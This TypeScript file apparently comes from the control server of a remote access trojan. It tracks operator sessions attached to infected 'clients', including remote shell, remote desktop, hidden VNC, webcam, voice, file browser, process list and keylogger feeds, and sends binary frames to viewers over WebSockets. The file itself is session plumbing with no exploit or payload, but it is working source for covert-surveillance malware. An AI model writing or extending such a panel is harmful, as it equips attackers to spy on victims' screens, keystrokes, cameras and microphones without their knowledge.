import type { ServerWebSocket } from "bun";
import type {
  ConsoleSession,
  RemoteDesktopViewer,
  FileBrowserViewer,
  ProcessViewer,
  VoiceViewer,
  NotificationsViewer,
  KeyloggerViewer,
  SocketData,
} from "./types";

export type DashboardViewer = {
  id: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
  userId?: number;
  userRole?: string;
};

const consoleSessions = new Map<string, ConsoleSession>();
const rdSessions = new Map<string, RemoteDesktopViewer>();
const webcamSessions = new Map<string, RemoteDesktopViewer>();
const hvncSessions = new Map<string, RemoteDesktopViewer>(); // HVNC uses same structure as RD
const rdSessionsByClient = new Map<string, Set<string>>();
const webcamSessionsByClient = new Map<string, Set<string>>();
const hvncSessionsByClient = new Map<string, Set<string>>();
const fileBrowserSessions = new Map<string, FileBrowserViewer>();
const processSessions = new Map<string, ProcessViewer>();
const notificationSessions = new Map<string, NotificationsViewer>();
const keyloggerSessions = new Map<string, KeyloggerViewer>();
const voiceSessions = new Map<string, VoiceViewer>();
const dashboardSessions = new Map<string, DashboardViewer>();

function addSessionToClientIndex(
  index: Map<string, Set<string>>,
  clientId: string,
  sessionId: string,
): void {
  let set = index.get(clientId);
  if (!set) {
    set = new Set<string>();
    index.set(clientId, set);
  }
  set.add(sessionId);
}

function removeSessionFromClientIndex(
  index: Map<string, Set<string>>,
  clientId: string,
  sessionId: string,
): void {
  const set = index.get(clientId);
  if (!set) return;
  set.delete(sessionId);
  if (set.size === 0) {
    index.delete(clientId);
  }
}

export function addConsoleSession(session: ConsoleSession): void {
  consoleSessions.set(session.id, session);
}

export function getConsoleSession(
  sessionId: string,
): ConsoleSession | undefined {
  return consoleSessions.get(sessionId);
}

export function deleteConsoleSession(sessionId: string): boolean {
  return consoleSessions.delete(sessionId);
}

export function getConsoleSessionsByClient(clientId: string): ConsoleSession[] {
  return Array.from(consoleSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllConsoleSessions(): Map<string, ConsoleSession> {
  return consoleSessions;
}

export function addRdSession(session: RemoteDesktopViewer): void {
  rdSessions.set(session.id, session);
  addSessionToClientIndex(rdSessionsByClient, session.clientId, session.id);
}

export function addWebcamSession(session: RemoteDesktopViewer): void {
  webcamSessions.set(session.id, session);
  addSessionToClientIndex(webcamSessionsByClient, session.clientId, session.id);
}

export function getWebcamSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return webcamSessions.get(sessionId);
}

export function deleteWebcamSession(sessionId: string): boolean {
  const existing = webcamSessions.get(sessionId);
  if (!existing) return false;
  webcamSessions.delete(sessionId);
  removeSessionFromClientIndex(webcamSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getWebcamSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return getWebcamSessionsForClient(clientId);
}

export function getWebcamSessionsForClient(clientId: string): RemoteDesktopViewer[] {
  const ids = webcamSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: RemoteDesktopViewer[] = [];
  for (const id of ids) {
    const session = webcamSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function hasWebcamSessionsForClient(clientId: string): boolean {
  const ids = webcamSessionsByClient.get(clientId);
  return Boolean(ids && ids.size > 0);
}

export function getAllWebcamSessions(): Map<string, RemoteDesktopViewer> {
  return webcamSessions;
}

export function getRdSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return rdSessions.get(sessionId);
}

export function deleteRdSession(sessionId: string): boolean {
  const existing = rdSessions.get(sessionId);
  if (!existing) return false;
  rdSessions.delete(sessionId);
  removeSessionFromClientIndex(rdSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getRdSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return getRdSessionsForClient(clientId);
}

export function getRdSessionsForClient(clientId: string): RemoteDesktopViewer[] {
  const ids = rdSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: RemoteDesktopViewer[] = [];
  for (const id of ids) {
    const session = rdSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function hasRdSessionsForClient(clientId: string): boolean {
  const ids = rdSessionsByClient.get(clientId);
  return Boolean(ids && ids.size > 0);
}

export function getAllRdSessions(): Map<string, RemoteDesktopViewer> {
  return rdSessions;
}

// ==================== HVNC SESSION MANAGEMENT ====================

export function addHvncSession(session: RemoteDesktopViewer): void {
  hvncSessions.set(session.id, session);
  addSessionToClientIndex(hvncSessionsByClient, session.clientId, session.id);
}

export function getHvncSession(
  sessionId: string,
): RemoteDesktopViewer | undefined {
  return hvncSessions.get(sessionId);
}

export function deleteHvncSession(sessionId: string): boolean {
  const existing = hvncSessions.get(sessionId);
  if (!existing) return false;
  hvncSessions.delete(sessionId);
  removeSessionFromClientIndex(hvncSessionsByClient, existing.clientId, sessionId);
  return true;
}

export function getHvncSessionsByClient(clientId: string): RemoteDesktopViewer[] {
  return getHvncSessionsForClient(clientId);
}

export function getHvncSessionsForClient(clientId: string): RemoteDesktopViewer[] {
  const ids = hvncSessionsByClient.get(clientId);
  if (!ids || ids.size === 0) return [];
  const sessions: RemoteDesktopViewer[] = [];
  for (const id of ids) {
    const session = hvncSessions.get(id);
    if (session) sessions.push(session);
  }
  return sessions;
}

export function hasHvncSessionsForClient(clientId: string): boolean {
  const ids = hvncSessionsByClient.get(clientId);
  return Boolean(ids && ids.size > 0);
}

export function getAllHvncSessions(): Map<string, RemoteDesktopViewer> {
  return hvncSessions;
}

export function getHvncSessionCount(): number {
  return hvncSessions.size;
}

// ==================== FILE BROWSER SESSION MANAGEMENT ====================

export function addFileBrowserSession(session: FileBrowserViewer): void {
  fileBrowserSessions.set(session.id, session);
}

export function getFileBrowserSession(
  sessionId: string,
): FileBrowserViewer | undefined {
  return fileBrowserSessions.get(sessionId);
}

export function deleteFileBrowserSession(sessionId: string): boolean {
  return fileBrowserSessions.delete(sessionId);
}

export function getFileBrowserSessionsByClient(
  clientId: string,
): FileBrowserViewer[] {
  return Array.from(fileBrowserSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllFileBrowserSessions(): Map<string, FileBrowserViewer> {
  return fileBrowserSessions;
}

export function addProcessSession(session: ProcessViewer): void {
  processSessions.set(session.id, session);
}

export function getProcessSession(
  sessionId: string,
): ProcessViewer | undefined {
  return processSessions.get(sessionId);
}

export function deleteProcessSession(sessionId: string): boolean {
  return processSessions.delete(sessionId);
}

export function getProcessSessionsByClient(clientId: string): ProcessViewer[] {
  return Array.from(processSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllProcessSessions(): Map<string, ProcessViewer> {
  return processSessions;
}

export function addNotificationSession(session: NotificationsViewer): void {
  notificationSessions.set(session.id, session);
}

export function deleteNotificationSession(sessionId: string): boolean {
  return notificationSessions.delete(sessionId);
}

export function getAllNotificationSessions(): Map<string, NotificationsViewer> {
  return notificationSessions;
}

export function getConsoleSessionCount(): number {
  return consoleSessions.size;
}

export function getRdSessionCount(): number {
  return rdSessions.size;
}

export function getFileBrowserSessionCount(): number {
  return fileBrowserSessions.size;
}

export function getProcessSessionCount(): number {
  return processSessions.size;
}

export function getNotificationSessionCount(): number {
  return notificationSessions.size;
}

export function safeSendViewer(
  ws: ServerWebSocket<SocketData>,
  payload: any,
): boolean {
  try {
    ws.send(JSON.stringify(payload));
    return true;
  } catch (err) {
    return false;
  }
}

export function safeSendViewerFrame(
  ws: ServerWebSocket<SocketData>,
  bytes: Uint8Array,
  header?: any,
): number {
  try {
    const meta = JSON.stringify(header || {});
    const metaBytes = new TextEncoder().encode(meta);
    const metaLength = new Uint8Array(4);
    const view = new DataView(metaLength.buffer);
    view.setUint32(0, metaBytes.length, false);
    const buf = new Uint8Array(4 + metaBytes.length + bytes.length);
    buf.set(metaLength, 0);
    buf.set(metaBytes, 4);
    buf.set(bytes, 4 + metaBytes.length);
    ws.send(buf);
    return buf.length;
  } catch (err) {
    return 0;
  }
}

export function addKeyloggerSession(session: KeyloggerViewer): void {
  keyloggerSessions.set(session.id, session);
}

export function getKeyloggerSession(
  sessionId: string,
): KeyloggerViewer | undefined {
  return keyloggerSessions.get(sessionId);
}

export function deleteKeyloggerSession(sessionId: string): boolean {
  return keyloggerSessions.delete(sessionId);
}

export function getKeyloggerSessionsByClient(
  clientId: string,
): KeyloggerViewer[] {
  return Array.from(keyloggerSessions.values()).filter(
    (s) => s.clientId === clientId,
  );
}

export function getAllKeyloggerSessions(): Map<string, KeyloggerViewer> {
  return keyloggerSessions;
}

export function addVoiceSession(session: VoiceViewer): void {
  voiceSessions.set(session.id, session);
}

export function getVoiceSession(sessionId: string): VoiceViewer | undefined {
  return voiceSessions.get(sessionId);
}

export function deleteVoiceSession(sessionId: string): boolean {
  return voiceSessions.delete(sessionId);
}

export function getVoiceSessionsByClient(clientId: string): VoiceViewer[] {
  return Array.from(voiceSessions.values()).filter((s) => s.clientId === clientId);
}

export function getAllVoiceSessions(): Map<string, VoiceViewer> {
  return voiceSessions;
}

export function addDashboardSession(session: DashboardViewer): void {
  dashboardSessions.set(session.id, session);
}

export function deleteDashboardSession(sessionId: string): boolean {
  return dashboardSessions.delete(sessionId);
}

export function getAllDashboardSessions(): Map<string, DashboardViewer> {
  return dashboardSessions;
}

export function getDashboardSessionCount(): number {
  return dashboardSessions.size;
}

let dashboardBroadcastTimer: ReturnType<typeof setTimeout> | null = null;
const DASHBOARD_DEBOUNCE_MS = 150;

export function notifyDashboardViewers(): void {
  if (dashboardBroadcastTimer) return;
  dashboardBroadcastTimer = setTimeout(() => {
    dashboardBroadcastTimer = null;
    const msg = JSON.stringify({ type: "clients_changed" });
    for (const [id, session] of dashboardSessions) {
      try {
        session.viewer.send(msg);
      } catch {
        dashboardSessions.delete(id);
      }
    }
  }, DASHBOARD_DEBOUNCE_MS);
}
